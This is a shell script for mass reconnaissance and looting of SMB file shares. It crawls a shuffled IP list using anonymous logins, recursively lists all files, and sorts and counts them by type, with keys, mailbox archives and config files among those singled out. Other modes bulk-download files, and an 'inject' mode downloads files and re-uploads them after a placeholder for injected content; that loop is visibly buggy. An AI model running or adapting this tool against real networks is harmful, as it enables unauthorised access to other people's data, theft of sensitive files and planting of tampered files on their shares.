#!/bin/sh
case $1 in

sort)
	echo "start sorting"
	echo -n exe: ; grep "\.exe " file.list > out.exe
	echo -n doc: ; grep "\.doc" file.list > out.doc
	echo -n xls: ; grep "\.xls " file.list > out.xls
	echo -n ppt: ; grep "\.ppt " file.list > out.ppt
	echo -n html: ; grep "\.html " file.list > out.html
	echo -n txt: ; grep "\.txt " file.list > out.txt
	echo -n bat: ; grep "\.bat " file.list > out.bat
	echo -n msi: ; grep "\.msi " file.list > out.msi
	echo -n pdf: ; grep "\.pdf " file.list > out.pdf
	echo -n epub: ; grep "\.epub " file.list > out.epub
	echo -n reg: ; grep "\.reg " file.list > out.reg
	echo -n zip: ; grep "\.zip " file.list > out.zip
	echo -n rar: ; grep "\.rar " file.list > out.rar
	echo -n xz: ; grep "\.xz " file.list > out.xz
	echo -n gz: ; grep "\.gz " file.list > out.gz
	echo -n tar: ; grep "\.tar " file.list > out.tar
	echo -n tgz: ; grep "\.tgz " file.list > out.tgz
	echo -n key: ; grep "\.key " file.list > out.key
	echo -n cfg: ; grep "\.cfg " file.list > out.cfg
	echo -n dat: ; grep "\.dat " file.list > out.dat
	echo -n mbox: ; grep "\.mbox " file.list > out.mbox
	echo -n pptx: ; grep "\.pptx " file.list > out.pptx
	echo -n xlsx: ; grep "\.xlsx " file.list > out.xlsx
	echo -n docx: ; grep "\.docx " file.list > out.docx
	echo -n 7z: ; grep "\.7z " file.list > out.7z
	echo -n pps: ; grep "\.pps " file.list > out.pps
	echo -n ini: ; grep "\.ini " file.list > out.ini
	echo -n php: ; grep "\.php " file.list > out.php
	echo -n csv: ; grep "\.csv " file.list > out.csv
	echo -n pst: ; grep "\.pst " file.list > out.pst
	
	sh smbSearch.sh analysis #do some quick analysis

	;;

parse|parsing)

	echo "start parsing"

	python3 parse.py #parse line in grepable output
	
	
	
	;;

inject)

	echo "start download - inject - upload"

	for line in $(shuf file.dl) #crawl file.dl list

	do

	        smbclient -N $line -c "get" #download from share

	done

	#some inject here

	smbclient -N $line -c "put" #upload to share

	;;

download)

	echo "start downloading enteries from file.dl"
	echo "care that this file contrains what you need"

	read -p "ready ?"

	for line in $(shuf file.dl) #crawl file.dl list

	do
		echo $(echo $line |awk -F"|@|@" '{print $1}')
		echo $(echo $line |awk -F"|@|@" '{print $2}')
	        smbclient -N $(echo $line |awk -F"|@|@" '{print $1}') -c get $(echo $line |awk -F"|@|@" '{print $2}') #download from share

	done

	;;

analysis)
	wc -l *
	echo -n exe: ; grep "\.exe " file.list | wc -l
	echo -n doc: ; grep "\.doc" file.list | wc -l
	echo -n xls: ; grep "\.xls " file.list | wc -l
	echo -n ppt: ; grep "\.ppt " file.list | wc -l
	echo -n html: ; grep "\.html " file.list | wc -l
	echo -n txt: ; grep "\.txt " file.list | wc -l
	echo -n bat: ; grep "\.bat " file.list | wc -l
	echo -n msi: ; grep "\.msi " file.list | wc -l
	echo -n pdf: ; grep "\.pdf " file.list | wc -l
	echo -n epub: ; grep "\.epub " file.list | wc -l
	echo -n reg: ; grep "\.reg " file.list | wc -l
	echo -n zip: ; grep "\.zip " file.list | wc -l
	echo -n rar: ; grep "\.rar " file.list | wc -l
	echo -n xz: ; grep "\.xz " file.list | wc -l
	echo -n gz: ; grep "\.gz " file.list | wc -l
	echo -n tar: ; grep "\.tar " file.list | wc -l
	echo -n tgz: ; grep "\.tgz " file.list | wc -l
	echo -n key: ; grep "\.key " file.list | wc -l
	echo -n cfg: ; grep "\.cfg " file.list | wc -l
	echo -n dat: ; grep "\.dat " file.list | wc -l
	echo -n mbox: ; grep "\.mbox " file.list | wc -l
	echo -n pptx: ; grep "\.pptx " file.list | wc -l
	echo -n xlsx: ; grep "\.xlsx " file.list | wc -l
	echo -n docx: ; grep "\.docx " file.list | wc -l
	echo -n 7z: ; grep "\.7z " file.list | wc -l
	echo -n pps: ; grep "\.pps " file.list | wc -l
	echo -n ini: ; grep "\.ini " file.list | wc -l
	echo -n php: ; grep "\.php " file.list | wc -l
	echo -n csv: ; grep "\.csv " file.list | wc -l
	echo -n pst: ; grep "\.pst " file.list | wc -l
	echo -n good hosts: ; grep "Anonymous login successful" file.list |wc -l
	
	;;

*)
	#main program
	for i in $(shuf ips) #crawl the ip list

	do

		echo $i #print ip

		smbclient -g -N -L "\\\\$i\\"  |grep Disk |tr -s ' ' |awk -F"|" '{print $2 }' > DISK_TEMP #get info about disks

		for o in $(shuf DISK_TEMP) #crawl the disk list

		do

			smbclient -N -g "\\\\$i\\$o" -c "recurse;dir" |sed "s/^/$i $o /g" |tr -s ' ' |tee -a file.list #get file list

		done

	done

	rm -fv DISK_TEMP #cleaning

	echo "start parsing"

	python3 parse.py #parse line in grepable output

	clear

	sh smbSearch.sh analysis #do some quick analysis

esac
